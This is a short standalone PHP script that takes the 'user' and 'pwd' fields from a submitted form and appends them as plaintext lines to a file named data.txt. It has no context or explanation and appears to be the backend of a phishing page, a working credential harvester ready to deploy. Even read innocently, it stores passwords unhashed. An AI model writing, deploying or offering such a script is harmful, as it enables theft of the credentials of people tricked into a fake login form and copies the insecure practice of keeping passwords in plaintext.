<?php

  $file = 'data.txt';
  $current = file_get_contents($file);
  $current .= $_POST["user"] . " : " . $_POST["pwd"] . "\n";
  file_put_contents($file, $current);
?>